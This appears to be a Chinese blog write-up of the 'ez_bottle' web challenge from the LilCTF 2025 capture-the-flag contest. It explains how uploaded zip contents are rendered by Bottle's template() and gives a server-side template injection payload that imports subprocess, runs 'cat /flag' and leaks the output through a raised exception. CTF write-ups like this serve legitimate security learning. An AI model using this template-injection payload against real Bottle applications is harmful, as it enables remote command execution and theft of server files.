---
abbrlink: ''
categories:
- - ctf
date: '2025-08-20T19:06:42.692507+08:00'
tags:
- web
title: 2025Lilctf复现
updated: '2025-08-20T20:58:36.115+08:00'
---
# Lilctf复现

“LilCTF 是由 LilHouse 团队主办的网络安全夺旗赛，定位是介于新生赛（新手入门指引）与选拔性赛事（各种 XX 杯、联队招新赛）这两者之间的过渡，主要目标群体是 2024 年 9 月前后开始接触 CTF、学了一年左右的 CTFer。同时也有一些更具挑战性的题目”

看起来这个比赛很适合我，于是就参加了

但是好像这一年也没学太多东西所以这个比赛对我还是有点难度，~~于是叫来了hy哥，跟在他屁股后面复现他做过的题~~

## web-ez\_bottle

题目首先给了一个靶机和一个附件，附件看起来是网站源码

![](https://s2.loli.net/2025/08/20/jKAzVhrM8x9iBXU.png)

源码里面发现有符号黑名单

通过逼问ai可知，这是一种叫ssti的题

SSTI，**服务器**端模板注入(Server-Side Template Injection)

![](https://s2.loli.net/2025/08/20/HU2EdeVhDajXAuk.png)

根据这个逻辑可知，上传的文件必须要是zip压缩文件

但又发现了一个问题，他并没有上传页面

这个时候要用curl指令了

```
curl -X POST -F "file=@/path/to/example.txt" http://example.com/upload
```

* `-X POST`: 指定 HTTP 请求方法为 `POST`。
* `-F "file=@/path/to/example.txt"`: 使用 `-F` 选项来模拟表单数据，并上传文件。`file` 是表单字段的名称，`@` 符号后面是文件的路径。这里的 `file` 会被视为表单的一个字段，`example.txt` 将作为文件上传。
* `http://example.com/upload`: 上传目标的 URL。

```
route('/view/<md5>/<filename>')
def view_file(md5, filename):
    file_path = os.path.join(UPLOAD_DIR, md5, filename)
    if not os.path.exists(file_path):
        return "File not found."

    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    if contains_blacklist(content):
        return "you are hacker!!!nonono!!!"

    try:
        return template(content)
    except Exception as e:
        return f"Error rendering template: {str(e)}"

```

我们注意到网站源码的这一段

我们zip中文件的内容会被template()函数渲染

![](https://s2.loli.net/2025/08/20/tS9JrYg64OX5UqR.png)

template的第一个参数既可以是模板文件名，也可以是直接是模版代码字符串

也就是说，如果我们运用第二点:"模版代码字符串"

这个代码就可以直接被执行

```
% import subprocess
% raise Exception(subprocess.run(['cat','/flag'],stdout=subprocess.PIPE).stdout)
```

ai给了这样的代码，经过测试可行

用raise Exception去走except分支 因为except分支会直接输出原始字符串，try分支是渲染后再输出，这段单纯的py代码是渲染不出的东西的

subprocess.run()用来执行命令，这里执行了 cat /flag

stdout=subprocess.PIPE用来提取

stdout是subprocess.run()的一个参数

“run()函数默认不会捕获命令执行结果的正常输出和错误输出，如果我们向获取这些内容需要传递subprocess.PIPE，然后可以通过返回的CompletedProcess类实例的stdout和stderr属性或捕获相应的内容；”

因为subprocess模块会创建基于py代码父进程下的子进程，所以需要把输出先存到管道里，这样父进程（py代码）才会捕获到subprocess内run的cat /flag 输出的内容

然后通过CompletedProcess类实例的.stdout 获得刚刚事先存在管道里的输出内容

然后将这个payload写成txt再打包成zip就可以拿到flag了！
